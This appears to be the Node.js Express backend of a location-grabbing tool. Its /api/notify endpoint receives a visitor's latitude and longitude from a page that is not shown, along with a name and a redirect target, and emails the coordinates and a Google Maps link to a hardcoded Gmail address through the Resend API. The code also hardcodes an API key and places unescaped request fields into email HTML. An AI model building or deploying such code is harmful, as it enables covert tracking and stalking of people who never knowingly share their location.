const express = require('express');
const path = require('path');
const app = express();
const port = process.env.PORT || 5000;
const { Resend } = require('resend');

// Hardcoded Resend API key
const RESEND_API_KEY = 're_1234567890abcdef1234567890abcdef'; // Replace with your actual Resend API key

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.get('/', (req, res) => {
    return res.sendFile(path.resolve('./public/index.html'));
});

app.post('/api/notify', async (req, res) => {
    const { latitude, longitude, error, queryName, redirectTo } = req.body;
    console.log(queryName);

    try {
        if (error) {
            await sendEmail({ title: 'Error in notification', body: 'Error in notification', user: queryName || "" });
            console.log('Error in notification');
            return res.send('Error in notification');
        }

        await sendEmail({
            title: 'Aa gaya bhai',
            body: `latitude is: ${latitude} <br> longitude is: ${longitude}
            <a href="https://www.google.com/maps?q=${latitude},${longitude}">open maps</a>`,
            user: queryName || ""
        });
        return res.send('Notification received');
    } catch (err) {
        console.error('Error in /api/notify:', err);
        return res.status(500).send('Internal Server Error');
    }
});

const server = app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

// Graceful shutdown handling
process.on('SIGTERM', () => {
    console.log('SIGTERM signal received: closing HTTP server');
    server.close(() => {
        console.log('HTTP server closed');
        process.exit(0);
    });
});

// Global error handling
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
    process.exit(1);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
    process.exit(1);
});

async function sendEmail({ title, body, user }) {
    const resend = new Resend(RESEND_API_KEY); // Use the hardcoded API key
    console.log('Sending email');
    try {
        const { data, error } = await resend.emails.send({
            from: 'Chhotu kalu<onboarding@resend.dev>',
            to: ['comeingame72@gmail.com'],
            subject: 'Oh Akram Great',
            html: `
              <h1>${title}</h1>
              <p>${body}</p>
              <p>User: ${user}</p>`
        });

        if (error) {
            console.error('Email error:', error);
            return;
        }

        console.log('Email sent:', data);
    } catch (err) {
        console.error('Error sending email:', err);
    }
}
